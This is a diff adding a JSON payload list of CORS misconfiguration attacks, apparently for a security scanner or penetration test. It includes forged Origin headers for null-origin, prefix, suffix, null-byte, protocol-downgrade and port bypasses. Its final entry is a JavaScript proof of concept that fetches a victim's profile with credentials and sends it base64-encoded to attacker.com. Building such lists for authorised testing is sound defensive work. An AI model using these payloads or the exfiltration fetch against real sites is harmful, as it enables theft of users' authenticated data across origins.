@@ -1,0 +1,14 @@
+[
+  {"name":"Null Origin","category":"CORS","description":"Test null origin allowed","payload":"Origin: null","tags":["null-origin","misconfig"]},
+  {"name":"Subdomain Wildcard","category":"CORS","description":"Attacker subdomain reflecting as allowed origin","payload":"Origin: https://attacker.target.com","tags":["subdomain","misconfig"]},
+  {"name":"Prefix Match Bypass","category":"CORS","description":"Bypass prefix-based origin check","payload":"Origin: https://target.com.attacker.com","tags":["prefix","bypass"]},
+  {"name":"Suffix Match Bypass","category":"CORS","description":"Bypass suffix-based origin check","payload":"Origin: https://attackertarget.com","tags":["suffix","bypass"]},
+  {"name":"HTTP to HTTPS","category":"CORS","description":"HTTP version of trusted HTTPS origin","payload":"Origin: http://target.com","tags":["http","downgrade"]},
+  {"name":"Wildcard Credential","category":"CORS","description":"Wildcard with credentials - browser blocks but test anyway","payload":"Access-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true","tags":["wildcard","credential","misconfig"]},
+  {"name":"Reflected Origin","category":"CORS","description":"Server reflects any origin back","payload":"Origin: https://evil.com","tags":["reflected","critical"]},
+  {"name":"CORS Preflight Bypass","category":"CORS","description":"Simple request to bypass preflight","payload":"Content-Type: text/plain\nOrigin: https://evil.com","tags":["preflight","bypass"]},
+  {"name":"Trusted Null Subdomain","category":"CORS","description":"file:// and sandbox iframes send null","payload":"Origin: null","tags":["null","sandbox","iframe"]},
+  {"name":"Unicode Variation","category":"CORS","description":"Unicode character variation in domain","payload":"Origin: https://target.com\u0000.evil.com","tags":["unicode","bypass"]},
+  {"name":"Port Variation","category":"CORS","description":"Different port of trusted origin","payload":"Origin: https://target.com:8080","tags":["port","misconfig"]},
+  {"name":"CORS PoC Fetch","category":"CORS","description":"JavaScript PoC for CORS exploitation","payload":"fetch('https://target.com/api/profile',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://attacker.com/?d='+btoa(d)))","tags":["poc","javascript","exploit"]}
+]
